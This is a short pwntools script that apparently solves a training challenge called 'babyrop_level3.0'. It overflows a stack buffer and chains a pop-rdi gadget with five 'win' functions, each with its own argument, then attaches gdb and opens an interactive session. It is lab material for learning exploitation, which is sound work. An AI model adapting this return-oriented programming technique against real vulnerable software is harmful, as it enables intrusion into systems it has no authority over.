from pwn import *

binary = 'babyrop_level3.0'

p = process(binary)

pop_rdi = 0x0000000000401fd3
win1 = 0x0000000000401865
win2 = 0x0000000000401a24
win3 = 0x0000000000401b04
win4 = 0x0000000000401be6
win5 = 0x0000000000401941
gdb.attach(p, '''
b * challenge+487
''')

offset = 0x40 + 8
payload = flat(
	b'A' * offset,
	p64(pop_rdi),
	p64(1),
	p64(win1),
	p64(pop_rdi),
	p64(2),
	p64(win2),
	p64(pop_rdi),
	p64(3),
	p64(win3),
	p64(pop_rdi),
	p64(4),
	p64(win4),
	p64(pop_rdi),
	p64(5),
	p64(win5)
)
p.sendline(payload)
p.interactive()
